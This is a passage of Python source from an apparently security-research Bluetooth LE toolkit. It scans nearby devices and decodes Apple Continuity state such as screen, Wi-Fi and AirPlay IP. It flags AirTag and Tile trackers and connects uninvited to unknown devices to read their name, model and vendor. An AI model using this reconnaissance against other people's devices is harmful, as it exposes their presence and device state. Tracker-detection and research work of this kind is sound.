                        "tx_power": struct.unpack('b', mfr_data[24:25])[0] if len(mfr_data) > 24 else None
                    }
                    result["is_tracker"] = True
                    result["tracker_type"] = "iBeacon"

            elif msg_type == 0x09:  # AirPlay Target
                if len(mfr_data) >= 8:
                    # Last 4 bytes are IP address
                    ip_bytes = mfr_data[-4:]
                    result["airplay_ip"] = f"{ip_bytes[0]}.{ip_bytes[1]}.{ip_bytes[2]}.{ip_bytes[3]}"

            elif msg_type == 0x10:  # Nearby Info
                if msg_len >= 2:
                    flags = mfr_data[4] >> 4
                    action_code = mfr_data[4] & 0x0F
                    status = mfr_data[5] if len(mfr_data) > 5 else 0

                    result["nearby_info"] = {
                        "action": APPLE_NEARBY_ACTION_CODES.get(action_code, f"0x{action_code:02X}"),
                        "action_code": action_code,
                        "primary_device": bool(flags & 0x1),
                        "airdrop_enabled": bool(flags & 0x4),
                        "wifi_on": bool(status & 0x4),
                        "screen_on": bool(status & 0x1),
                        "watch_locked": bool(status & 0x20),
                        "auto_lock": bool(status & 0x80),
                    }

            elif msg_type == 0x0F:  # Nearby Action
                if msg_len >= 2:
                    action_type = mfr_data[5] if len(mfr_data) > 5 else 0
                    result["nearby_action"] = {
                        "type": APPLE_NEARBY_ACTION_TYPES.get(action_type, f"0x{action_type:02X}")
                    }

            elif msg_type == 0x12:  # FindMy / AirTag
                if len(mfr_data) > 4:
                    status = mfr_data[4]
                    maintained = bool((status >> 2) & 0x1)
                    result["findmy"] = {
                        "maintained": maintained,
                        "status": "Owned" if maintained else "Separated"
                    }
                    result["is_tracker"] = True
                    result["tracker_type"] = "AirTag/FindMy"

            elif msg_type == 0x07:  # Proximity Pairing (AirPods, etc)
                result["proximity_pairing"] = True
                # Device model info is encoded but proprietary

        except Exception as e:
            result["parse_error"] = str(e)

        return result

    def detect_tracker(data: AdvertisingData) -> dict:
        """Detect if device is a tracker (AirTag, Tile, Chipolo, etc).

        Returns dict with tracker info or empty dict if not a tracker.
        """
        result = {}

        # Check manufacturer data for Apple trackers
        mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
        if mfr_data and len(mfr_data) >= 2:
            company_id = struct.unpack('<H', mfr_data[:2])[0]

            # Parse Apple Continuity for FindMy/iBeacon
            if company_id == 0x004C:
                apple_data = parse_apple_continuity(mfr_data)
                if apple_data.get("is_tracker"):
                    result.update(apple_data)

            # Tile uses company ID 0x038F or 0x0891
            elif company_id in (0x038F, 0x0891):
                result["is_tracker"] = True
                result["tracker_type"] = "Tile"

        # Check service UUIDs for tracker services
        service_uuids = data.get(
            AdvertisingData.COMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS)
        if not service_uuids:
            service_uuids = data.get(
                AdvertisingData.INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS)

        if service_uuids and isinstance(service_uuids, bytes):
            # Parse 16-bit UUIDs (2 bytes each, little-endian)
            for i in range(0, len(service_uuids), 2):
                if i + 1 < len(service_uuids):
                    uuid16 = struct.unpack('<H', service_uuids[i:i+2])[0]
                    if uuid16 in TRACKER_SERVICES:
                        result["is_tracker"] = True
                        result["tracker_type"] = result.get(
                            "tracker_type") or TRACKER_SERVICES[uuid16]
                        result["tracker_service"] = f"0x{uuid16:04X}"

        return result

    def get_advertisement_details(data: AdvertisingData) -> dict:
        """Extract all interesting details from advertisement data."""
        details = {}

        # Get manufacturer data
        mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
        if mfr_data and len(mfr_data) >= 2:
            company_id = struct.unpack('<H', mfr_data[:2])[0]
            details["company_id"] = f"0x{company_id:04X}"
            details["company"] = COMPANIES.get(company_id, "Unknown")

            # Parse Apple Continuity
            if company_id == 0x004C:
                apple_data = parse_apple_continuity(mfr_data)
                if apple_data:
                    details["apple"] = apple_data

        # Detect trackers
        tracker_info = detect_tracker(data)
        if tracker_info.get("is_tracker"):
            details["tracker"] = tracker_info

        # Check for service UUIDs
        for uuid_type in [AdvertisingData.COMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS,
                          AdvertisingData.INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS]:
            service_uuids = data.get(uuid_type)
            if service_uuids and isinstance(service_uuids, bytes):
                uuids = []
                for i in range(0, len(service_uuids), 2):
                    if i + 1 < len(service_uuids):
                        uuid16 = struct.unpack('<H', service_uuids[i:i+2])[0]
                        uuids.append(f"0x{uuid16:04X}")
                if uuids:
                    details["service_uuids"] = uuids
                break

        # TX Power Level
        tx_power = data.get(AdvertisingData.TX_POWER_LEVEL)
        if tx_power is not None:
            details["tx_power"] = tx_power

        return details

    def clear_screen():
        """Clear terminal screen and reset cursor to top."""
        # Use both clear screen and move to home, plus clear scrollback
        import sys
        sys.stdout.write("\033[2J\033[H\033[3J")
        sys.stdout.flush()

    def move_cursor(row: int, col: int = 1):
        """Move cursor to position."""
        print(f"\033[{row};{col}H", end="", flush=True)

    def draw_table():
        """Draw the device table."""
        term_size = shutil.get_terminal_size((80, 24))
        width = term_size.columns
        height = term_size.lines

        clear_screen()

        # Header
        elapsed = time.time() - start_time[0] if start_time[0] else 0
        print("\033[1;36m" + "=" * width + "\033[0m")
        title = "  BLE SCANNER  "
        padding = (width - len(title)) // 2
        print("\033[1;36m" + " " * padding + title + " " * padding + "\033[0m")
        print("\033[1;36m" + "=" * width + "\033[0m")
        print()

        # Stats line with enumeration/scan status
        if enum_in_progress[0]:
            status_str = "  |  \033[1;35m⟳ ENUMERATING...\033[0m"
        elif scan_paused_since[0]:
            status_str = "  |  \033[1;31m⏸ SCAN PAUSED\033[0m"
        else:
            status_str = ""

        # Count trackers for warning
        tracker_count = sum(
            1 for _, info in devices_seen.items() if info.get("tracker"))
        tracker_str = f"  |  \033[1;31m⚠ {tracker_count} TRACKER(S)\033[0m" if tracker_count > 0 else ""

        stats = f"  Devices: \033[1;33m{len(devices_seen)}\033[0m  |  Packets: \033[1;33m{packet_count[0]}\033[0m  |  Time: \033[1;33m{elapsed:.0f}s\033[0m{tracker_str}{status_str}"
        print(stats)
        print()

        # Table header - fixed width columns (added INFO column)
        header = f"{'#':>3}  {'ADDRESS':<20}  {'RSSI':>7}  {'NAME':<20}  {'VENDOR':<14}  {'INFO':<8}"
        print("\033[1;37;44m  " + header + "  \033[0m")

        # Sort devices - trackers first, then by packet count
        sorted_devices = sorted(
            devices_seen.items(),
            key=lambda x: (1 if x[1].get("tracker")
                           else 0, x[1].get("count", 0)),
            reverse=True
        )

        # Calculate how many rows we can show (minimum 10)
        # At least 10 devices, more if terminal is tall
        max_rows = max(10, height - 12)

        # Display devices
        for idx, (addr, info) in enumerate(sorted_devices[:max_rows], 1):
            rssi = info.get("rssi", -99)
            name = info.get("name", "(unknown)")[:20]
            vendor = info.get("vendor", "")[:14]
            pkts = info.get("count", 0)
            bars = get_signal_bars(rssi)
            last_seen = info.get("last_seen", 0)
            age = time.time() - last_seen if last_seen else 999
            tracker = info.get("tracker")

            # Info column - show tracker type or packet count
            if tracker:
                info_str = f"⚠{tracker.get('tracker_type', 'TRACK')[:6]}"
            else:
                info_str = f"{pkts:>5}pk"

            # Color code - trackers in red, otherwise by signal strength
            if tracker:
                color = "\033[1;31m"  # Red for trackers
            elif rssi >= -50:
                color = "\033[1;32m"  # Green - excellent
            elif rssi >= -60:
                color = "\033[1;92m"  # Light green - good
            elif rssi >= -70:
                color = "\033[1;33m"  # Yellow - fair
            elif rssi >= -80:
                color = "\033[1;31m"  # Red - weak
            else:
                color = "\033[1;90m"  # Gray - very weak

            # Dim if not seen recently (but not trackers)
            if age > 5 and not tracker:
                color = "\033[2m"  # Dim

            row = f"{idx:>3}  {addr:<20}  {rssi:>4}dBm  {name:<20}  {vendor:<14}  {info_str:<8}"
            print(f"{color}  {row}  \033[0m")

        # Fill remaining rows
        for _ in range(max_rows - len(sorted_devices[:max_rows])):
            print()

        # Footer
        print()
        print("\033[1;36m" + "-" * width + "\033[0m")
        print("  \033[1;33mPress Ctrl+C to stop and select a device\033[0m")
        print("\033[1;36m" + "-" * width + "\033[0m")

        # Ensure output is flushed
        import sys
        sys.stdout.flush()

    def on_advertisement(advertisement):
        """Handle incoming BLE advertisement."""
        packet_count[0] += 1
        if start_time[0] is None:
            start_time[0] = time.time()

        addr_str = str(advertisement.address)
        rssi = advertisement.rssi

        # Apply filters
        if addr_filter and not addr_str.upper().startswith(addr_filter.upper()):
            return

        # Get name from advertisement data
        name = None
        vendor = ""
        adv_details = {}
        tracker_info = {}
        if advertisement.data:
            name = advertisement.data.get(AdvertisingData.COMPLETE_LOCAL_NAME)
            if not name:
                name = advertisement.data.get(
                    AdvertisingData.SHORTENED_LOCAL_NAME)
            if name and isinstance(name, bytes):
                name = name.decode('utf-8', errors='replace')
            vendor = get_manufacturer(advertisement.data)

            # Parse detailed advertisement data (Apple Continuity, trackers, etc.)
            adv_details = get_advertisement_details(advertisement.data)
            tracker_info = detect_tracker(advertisement.data)

        if name_filter:
            if not name or name_filter.lower() not in name.lower():
                return

        # Update or add device - preserve existing fields from enumeration
        existing = devices_seen.get(addr_str, {})

        # Only update name if we got a better one (not "(unknown)")
        new_name = name if name else existing.get("name", "(unknown)")

        # Only update vendor if we got a new one
        new_vendor = vendor if vendor else existing.get("vendor", "")

        # Update the dict in place to preserve enumeration data
        if addr_str in devices_seen:
            devices_seen[addr_str]["rssi"] = rssi
            devices_seen[addr_str]["last_seen"] = time.time()
            devices_seen[addr_str]["count"] = existing.get("count", 0) + 1
            if new_name != "(unknown)" and devices_seen[addr_str].get("name") == "(unknown)":
                devices_seen[addr_str]["name"] = new_name
            if new_vendor and not devices_seen[addr_str].get("vendor"):
                devices_seen[addr_str]["vendor"] = new_vendor
            if show_raw:
                devices_seen[addr_str]["raw_data"] = advertisement.data
            # Update advertisement details if we got new ones
            if adv_details:
                devices_seen[addr_str]["adv_details"] = adv_details
            if tracker_info.get("is_tracker"):
                devices_seen[addr_str]["tracker"] = tracker_info
        else:
            devices_seen[addr_str] = {
                "name": new_name,
                "rssi": rssi,
                "vendor": new_vendor,
                "last_seen": time.time(),
                "count": 1,
                "raw_data": advertisement.data if show_raw else None,
                "adv_details": adv_details,
                "tracker": tracker_info if tracker_info.get("is_tracker") else None,
            }

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BLEScanner"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        await device.power_on()

        # Set scan parameters - use ACTIVE scanning (1)
        # Active scanning sends SCAN_REQ to get SCAN_RSP with device names
        await device.send_command(
            HCI_LE_Set_Scan_Parameters_Command(
                le_scan_type=1,  # Active scanning
                le_scan_interval=0x0010,
                le_scan_window=0x0010,
                own_address_type=0,
                scanning_filter_policy=0,
            )
        )

        # Register advertisement handler
        device.on('advertisement', on_advertisement)

        # Enable scanning
        await device.send_command(
            HCI_LE_Set_Scan_Enable_Command(
                le_scan_enable=1,
                filter_duplicates=0,
            )
        )

        start_time[0] = time.time()

        from bumble.device import Peer
        from bumble.gatt import (
            GATT_DEVICE_NAME_CHARACTERISTIC,
            GATT_APPEARANCE_CHARACTERISTIC,
            GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
            GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
        )

        # Appearance values for device type identification
        APPEARANCES = {
            64: "Phone", 128: "Computer", 192: "Watch", 256: "Clock",
            320: "Display", 384: "Remote", 640: "Media Player",
            960: "HID", 961: "Keyboard", 962: "Mouse", 963: "Joystick",
            964: "Gamepad", 1088: "Running Sensor", 1152: "Cycling",
            2112: "Audio Sink", 2113: "Speaker", 2176: "Audio Source",
            2240: "Wearable", 2241: "Wristwatch", 3136: "Pulse Oximeter",
            3200: "Weight Scale", 5184: "Hearing Aid",
        }

        async def enumerate_one_device(addr_str: str):
            """Try to enumerate a single device - runs in background."""
            if addr_str not in devices_seen:
                return

            info = devices_seen[addr_str]
            # Skip if already has a name
            if info.get("name") and info["name"] != "(unknown)":
                return

            connection = None
            try:
                # Stop scanning temporarily to connect
                scan_paused_since[0] = time.time()
                await device.send_command(
                    HCI_LE_Set_Scan_Enable_Command(
                        le_scan_enable=0, filter_duplicates=0)
                )

                clean_addr = addr_str.replace("/P", "")
                target = Address(clean_addr)

                connection = await asyncio.wait_for(
                    device.connect(target),
                    timeout=3.0  # Short timeout
                )

                peer = Peer(connection)
                try:
                    await asyncio.wait_for(peer.discover_services(), timeout=3.0)
                    await asyncio.wait_for(peer.discover_characteristics(), timeout=2.0)
                except asyncio.TimeoutError:
                    pass

                info["services_count"] = len(peer.services)
                info["connectable"] = True

                # Determine device type from services
                service_types = []
                for service in peer.services:
                    suuid = str(service.uuid).lower()
                    if "1812" in suuid:
                        service_types.append("HID")
                    elif "180d" in suuid:
                        service_types.append("Heart Rate")
                    elif "180f" in suuid:
                        service_types.append("Battery")
                    elif "1108" in suuid or "110b" in suuid or "110a" in suuid:
                        service_types.append("Audio")

                # Read key characteristics
                for service in peer.services:
                    for char in service.characteristics:
                        try:
                            if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["name"] = value.decode(
                                        'utf-8', errors='replace')
                            elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value and len(value) >= 2:
                                    app_val = struct.unpack('<H', value[:2])[0]
                                    info["appearance"] = APPEARANCES.get(
                                        app_val, f"0x{app_val:04X}")
                            elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["vendor"] = value.decode(
                                        'utf-8', errors='replace')
                            elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC:
                                value = await asyncio.wait_for(peer.read_value(char), timeout=1.5)
                                if value:
                                    info["model"] = value.decode(
                                        'utf-8', errors='replace')
                        except Exception:
                            pass

                if service_types:
                    info["device_type"] = "/".join(set(service_types))

            except asyncio.TimeoutError:
                info["connectable"] = False
            except Exception:
                info["connectable"] = False
            finally:
                try:
                    if connection:
                        await connection.disconnect()
                except Exception:
                    pass
                # Resume scanning
                try:
                    await device.send_command(
                        HCI_LE_Set_Scan_Enable_Command(
                            le_scan_enable=1, filter_duplicates=0)
                    )
                    scan_paused_since[0] = None
                except Exception:
                    pass
                enum_in_progress[0] = False

        async def maybe_enumerate_next():
            """Start enumerating the next unknown device if not busy."""
            if enum_in_progress[0]:
                return

            # Sort devices the same way as the table (by packet count, most active first)
            # This ensures we enumerate devices at the top of the table first
            sorted_for_enum = sorted(
                devices_seen.items(),
                key=lambda x: x[1].get("count", 0),
                reverse=True
            )

            # Find the first unknown device that we haven't tried yet
            for addr, info in sorted_for_enum:
                if info.get("connectable") is None and (not info.get("name") or info["name"] == "(unknown)"):
                    # Haven't tried this one yet and it's unknown
                    rssi = info.get("rssi", -999)
                    if rssi > -85:  # Only try devices with reasonable signal
                        enum_in_progress[0] = True
                        # Mark as tried (will update if successful)
                        info["connectable"] = False
                        asyncio.create_task(enumerate_one_device(addr))
                        return

        # Main loop - refresh display every second AND enumerate in background
        if timeout > 0:
            end_time = time.time() + timeout
            while time.time() < end_time and running[0]:
                draw_table()
                await maybe_enumerate_next()
                # Safety: if scanning has been paused for more than 15 seconds, force resume
                if scan_paused_since[0] and (time.time() - scan_paused_since[0]) > 15:
                    try:
                        await device.send_command(
                            HCI_LE_Set_Scan_Enable_Command(
                                le_scan_enable=1, filter_duplicates=0)
                        )
                        scan_paused_since[0] = None
                        enum_in_progress[0] = False
                    except Exception:
                        pass
                await asyncio.sleep(1)
        else:
            while running[0]:
                draw_table()
                await maybe_enumerate_next()
                # Safety: if scanning has been paused for more than 15 seconds, force resume
                if scan_paused_since[0] and (time.time() - scan_paused_since[0]) > 15:
                    try:
                        await device.send_command(
                            HCI_LE_Set_Scan_Enable_Command(
                                le_scan_enable=1, filter_duplicates=0)
                        )
                        scan_paused_since[0] = None
                        enum_in_progress[0] = False
                    except Exception:
                        pass
                await asyncio.sleep(1)

    except asyncio.CancelledError:
        pass
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logging.error("BLE scan failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        running[0] = False
        # Restore original signal handler
        try:
            signal.signal(signal.SIGINT, original_handler)
        except Exception:
            pass
        try:
            if device:
                await device.send_command(
                    HCI_LE_Set_Scan_Enable_Command(
                        le_scan_enable=0,
                        filter_duplicates=0,
                    )
                )
            # Close transport - enumeration already happened during scanning
            if t:
                await t.close()
        except Exception:
            pass

    # Clear screen and show final results
    clear_screen()
    print("\n\033[1;36m" + "=" * 70 + "\033[0m")
    print("\033[1;36m  SCAN COMPLETE\033[0m")
    print("\033[1;36m" + "=" * 70 + "\033[0m\n")

    elapsed = time.time() - start_time[0] if start_time[0] else 0
    print(f"  Duration: {elapsed:.1f} seconds")
    print(f"  Packets received: {packet_count[0]}")
    print(f"  Unique devices: {len(devices_seen)}\n")

    if not devices_seen:
        print("  No devices found.\n")
        return None

    # Count trackers
    tracker_count = sum(1 for _, info in devices_seen.items()
                        if info.get("tracker"))
    if tracker_count > 0:
        print(
            f"  \033[1;31m⚠ TRACKERS DETECTED: {tracker_count} potential tracking device(s)\033[0m\n")

    # Sort by connectable + name + RSSI for final display
    def sort_key(item):
        addr, info = item
        has_name = 1 if info.get("name") and info["name"] != "(unknown)" else 0
        connectable = 1 if info.get("connectable") else 0
        # Show trackers prominently
        is_tracker = 1 if info.get("tracker") else 0
        rssi = info.get("rssi", -999)
        return (is_tracker, connectable, has_name, rssi)

    sorted_devices = sorted(devices_seen.items(), key=sort_key, reverse=True)

    # Count enumeration results
    connectable_count = sum(
        1 for _, info in devices_seen.items() if info.get("connectable"))
    named_count = sum(1 for _, info in devices_seen.items()
                      if info.get("name") and info["name"] != "(unknown)")

    print(
        f"  \033[1;36mDevices discovered:\033[0m {len(devices_seen)} total, {named_count} named, {connectable_count} connectable\n")

    # Display enriched selection table directly (no second enumeration phase)
    print("\033[1;37;44m" +
          f"  {'#':<3} {'ADDRESS':<20} {'RSSI':<7} {'NAME':<22} {'TYPE':<12} {'VENDOR':<15} {'INFO':<8}" + "\033[0m")
    print()

    for idx, (addr, info) in enumerate(sorted_devices, 1):
        rssi = info.get("rssi", -99)
        name = info.get("name", "(unknown)")[:22]
        vendor = info.get("vendor", "")[:15]
        device_type = info.get("device_type", "")[:12]
        services = info.get("services_count", 0)
        connectable = info.get("connectable", False)
        tracker = info.get("tracker")

        # Determine info column content
        if tracker:
            info_str = f"🔴{tracker.get('tracker_type', 'TRACKER')[:6]}"
        elif services > 0:
            info_str = f"{services} svcs"
        else:
            info_str = "-"

        # Color based on tracker/connectivity and signal
        if tracker:
            color = "\033[1;31m"  # Red for trackers
        elif connectable:
            if rssi >= -60:
                color = "\033[1;32m"  # Green - connectable, strong
            elif rssi >= -80:
                color = "\033[1;33m"  # Yellow - connectable, medium
            else:
                color = "\033[0;33m"  # Dim yellow - connectable, weak
        else:
            color = "\033[1;90m"  # Gray - not connectable

        # Connection indicator
        conn_icon = "●" if connectable else ("⚠" if tracker else "○")

        print(
            f"{color}  {idx:<3} {conn_icon} {addr:<20} {rssi:>4}dBm {name:<22} {device_type:<12} {vendor:<15} {info_str:<8}\033[0m")

    print()
    print("\033[1;36m" + "-" * 95 + "\033[0m")
    print(
        "  \033[1;32m●\033[0m = Connectable    \033[1;90m○\033[0m = Not connectable    \033[1;31m⚠\033[0m = Potential Tracker")

    # Device selection
    try:
        choice = input(
            "\n  \033[1;33mEnter device number to select (or press Enter to skip): \033[0m")
        if choice.strip():
            try:
                idx = int(choice.strip()) - 1
                if 0 <= idx < len(sorted_devices):
                    selected_addr, selected_info = sorted_devices[idx]
                    name = selected_info.get('name', 'unknown')
                    model = selected_info.get('model', '')
                    vendor = selected_info.get('vendor', '')
                    tracker = selected_info.get('tracker')
                    adv_details = selected_info.get('adv_details', {})

                    print(f"\n  \033[1;32mSelected: {selected_addr}\033[0m")
                    if name and name != "(unknown)":
                        print(f"  \033[1;37mName: {name}\033[0m")
                    if model:
                        print(f"  \033[1;37mModel: {model}\033[0m")
                    if vendor:
                        print(f"  \033[1;37mVendor: {vendor}\033[0m")

                    # Show tracker warning
                    if tracker:
                        print(
                            f"\n  \033[1;31m⚠ TRACKER DETECTED: {tracker.get('tracker_type', 'Unknown')}\033[0m")
                        if tracker.get('findmy'):
                            fm = tracker['findmy']
                            print(f"    Status: {fm.get('status', 'Unknown')}")
                        if tracker.get('ibeacon'):
                            ib = tracker['ibeacon']
                            print(f"    iBeacon UUID: {ib.get('uuid', 'N/A')}")
                            print(
                                f"    Major/Minor: {ib.get('major', 'N/A')}/{ib.get('minor', 'N/A')}")

                    # Show Apple Continuity details
                    if adv_details.get('apple'):
                        apple = adv_details['apple']
                        print(
                            f"\n  \033[1;35mApple Continuity: {apple.get('type', 'Unknown')}\033[0m")
                        if apple.get('nearby_info'):
                            ni = apple['nearby_info']
                            print(
                                f"    Device State: {ni.get('action', 'Unknown')}")
                            print(
                                f"    WiFi: {'On' if ni.get('wifi_on') else 'Off'}, Screen: {'On' if ni.get('screen_on') else 'Off'}")
                            if ni.get('airdrop_enabled'):
                                print(f"    AirDrop: Enabled")
                        if apple.get('airplay_ip'):
                            print(f"    AirPlay IP: {apple['airplay_ip']}")
                        if apple.get('nearby_action'):
                            print(
                                f"    Action: {apple['nearby_action'].get('type', 'Unknown')}")

                    # Show company ID if known
                    if adv_details.get('company_id'):
                        print(
                            f"\n  \033[1;36mCompany ID: {adv_details['company_id']} ({adv_details.get('company', 'Unknown')})\033[0m")

                    print(
                        f"\n  \033[1;37mYou can now use this address with other commands:\033[0m")
                    print(
                        f"  \033[1;36m  --target-address {selected_addr}\033[0m")
                    print(
                        f"  \033[1;36m  python race_toolkit.py -c usb:0 --target-address {selected_addr} ble-info\033[0m\n")
                    return selected_addr
                else:
                    print(f"\n  \033[1;31mInvalid selection.\033[0m\n")
            except ValueError:
                print(f"\n  \033[1;31mInvalid input.\033[0m\n")
    except (EOFError, KeyboardInterrupt):
        print("\n  \033[1;33mExiting...\033[0m\n")
        return None

    return None


# =============================================================================
# BLE CHARACTERISTIC RESEARCH UTILITIES
# =============================================================================

async def lookup_oui_vendor(mac_address: str) -> dict:
    """Look up the vendor/manufacturer from a MAC address OUI.

    Args:
        mac_address: MAC address in format XX:XX:XX:XX:XX:XX

    Returns:
        Dictionary with vendor information
    """
    import urllib.request
    import urllib.error
    import json

    # Clean the MAC address and extract OUI
    mac_clean = mac_address.replace(
        "/P", "").replace(":", "").replace("-", "").upper()
    oui = mac_clean[:6]

    result = {
        "oui": f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}",
        "vendor": None,
        "address": None,
        "source": None
    }

    # Try macvendors.com API (simple and free)
    try:
        url = f"https://api.macvendors.com/{oui}"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            vendor = response.read().decode('utf-8').strip()
            if vendor and "Not Found" not in vendor:
                result["vendor"] = vendor
                result["source"] = "macvendors.com"
                return result
    except Exception:
        pass

    # Try maclookup.app API as fallback
    try:
        url = f"https://api.maclookup.app/v2/macs/{oui}"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode('utf-8'))
            if data.get("success") and data.get("found"):
                result["vendor"] = data.get("company")
                result["address"] = data.get("address")
                result["source"] = "maclookup.app"
                return result
    except Exception:
        pass

    return result


# Known BLE specifications database - maps UUIDs to their documented purpose
KNOWN_BLE_SPECIFICATIONS = {
    # ═══════════════════════════════════════════════════════════════════════════
    # BLUETOOTH SIG STANDARD SPECIFICATIONS
    # ═══════════════════════════════════════════════════════════════════════════

    # DULT (Detecting Unwanted Location Trackers) - IETF Draft
    "15190001-12f4-c226-88ed-2ac5579f2a85": {
        "name": "DULT Non-Owner Service",
        "description": "Accessory non-owner service for unwanted tracker detection",
        "spec": "IETF Draft: Detecting Unwanted Location Trackers",
        "url": "https://www.ietf.org/archive/id/draft-detecting-unwanted-location-trackers-01.html",
        "section": "3.10 Accessory Connections"
    },
    "8e0c0001-1d68-fb92-bf61-48377421680e": {
        "name": "DULT Non-Owner Characteristic",
        "description": "Accessory non-owner characteristic for unwanted tracker detection",
        "spec": "IETF Draft: Detecting Unwanted Location Trackers",
        "url": "https://www.ietf.org/archive/id/draft-detecting-unwanted-location-trackers-01.html",
        "section": "3.10 Accessory Connections"
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # APPLE - AirPods, AirTags, Find My, Continuity
    # ═══════════════════════════════════════════════════════════════════════════

    # Apple Continuity Service
    "d0611e78-bbb4-4591-a5f8-487910ae4366": {
        "name": "Apple Continuity Service",
        "description": "Apple Continuity features (Handoff, AirDrop, etc.)",
        "spec": "Apple Continuity Protocol",
        "url": "https://github.com/furiousMAC/continuern"
    },
    # Apple Notification Center Service (ANCS)
    "7905f431-b5ce-4e99-a40f-4b1e122d00d0": {
        "name": "Apple ANCS Service",
        "description": "Apple Notification Center Service for iOS notifications",
        "spec": "Apple ANCS Specification",
        "url": "https://developer.apple.com/library/archive/documentation/CoreBluetooth/Reference/AppleNotificationCenterServiceSpecification/"
    },
    "9fbf120d-6301-42d9-8c58-25e699a21dbd": {
        "name": "ANCS Notification Source",
        "description": "Notification source characteristic (notifies of new/modified/removed notifications)",
        "spec": "Apple ANCS Specification",
        "url": "https://developer.apple.com/library/archive/documentation/CoreBluetooth/Reference/AppleNotificationCenterServiceSpecification/"
    },
    "69d1d8f3-45e1-49a8-9821-9bbdfdaad9d9": {
        "name": "ANCS Control Point",
        "description": "Control point for requesting notification attributes",
        "spec": "Apple ANCS Specification",
        "url": "https://developer.apple.com/library/archive/documentation/CoreBluetooth/Reference/AppleNotificationCenterServiceSpecification/"
    },
    "22eac6e9-24d6-4bb5-be44-b36ace7c7bfb": {
        "name": "ANCS Data Source",
        "description": "Data source for notification attributes",
        "spec": "Apple ANCS Specification",
        "url": "https://developer.apple.com/library/archive/documentation/CoreBluetooth/Reference/AppleNotificationCenterServiceSpecification/"
    },
    # Apple Media Service (AMS)
    "89d3502b-0f36-433a-8ef4-c502ad55f8dc": {
        "name": "Apple Media Service",
        "description": "Apple Media Service for media control",
        "spec": "Apple AMS Specification",
        "url": "https://developer.apple.com/library/archive/documentation/CoreBluetooth/Reference/AppleMediaService_Ref/"
    },
    "9b3c81d8-57b1-4a8a-b8df-0e56f7ca51c2": {
        "name": "AMS Remote Command",
        "description": "Remote command characteristic for media control",
        "spec": "Apple AMS Specification",
        "url": None
    },
    "2f7cabce-808d-411f-9a0c-bb92ba96c102": {
        "name": "AMS Entity Update",
        "description": "Entity update notifications (track, player, queue)",
        "spec": "Apple AMS Specification",
        "url": None
    },
    "c6b2f38c-23ab-46d8-a6ab-a3a870bbd5d7": {
        "name": "AMS Entity Attribute",
        "description": "Read entity attributes (artist, album, title)",
        "spec": "Apple AMS Specification",
        "url": None
    },
    # Apple Find My / AirTag
    "fd43": {
        "name": "⚠️ Apple Find My Service",
        "description": "Apple Find My network service - POTENTIAL TRACKING DEVICE (AirTag, etc)",
        "spec": "Apple Find My Network",
        "url": "https://support.apple.com/guide/security/find-my-network-security",
        "tracker": True
    },
    "fd44": {
        "name": "⚠️ Apple Find My Service (Alt)",
        "description": "Apple Find My network service (alternate) - POTENTIAL TRACKING DEVICE",
        "spec": "Apple Find My Network",
        "url": "https://support.apple.com/guide/security/find-my-network-security",
        "tracker": True
    },
    # Apple AirPods
    "74ec2172-0bad-4d01-8f77-997b2be0722a": {
        "name": "Apple AirPods Service",
        "description": "Apple AirPods proprietary control service",
        "spec": "Apple AirPods Protocol (proprietary)",
        "url": None
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # GOOGLE - Fast Pair, Nearby Share, Android
    # ═══════════════════════════════════════════════════════════════════════════

    # Google Fast Pair Service (0xFE2C)
    "0000fe2c-0000-1000-8000-00805f9b34fb": {
        "name": "Google Fast Pair Service",
        "description": "Google Fast Pair for quick Bluetooth pairing",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications"
    },
    "fe2c1233-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Firmware Revision",
        "description": "Returns device firmware revision string",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1234-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Model ID",
        "description": "24-bit model ID for device identification",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1235-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Key-Based Pairing",
        "description": "Key-based pairing characteristic for secure Fast Pair",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1236-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Passkey",
        "description": "Passkey characteristic for Fast Pair authentication",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1237-8366-4814-8eb0-01de32100bea": {
        "name": "Fast Pair Account Key",
        "description": "Account key for personalized Fast Pair",
        "spec": "Google Fast Pair Specification",
        "url": "https://developers.google.com/nearby/fast-pair/specifications/characteristics"
    },
    "fe2c1238-8366-4814-8eb0-01de32100bea": {
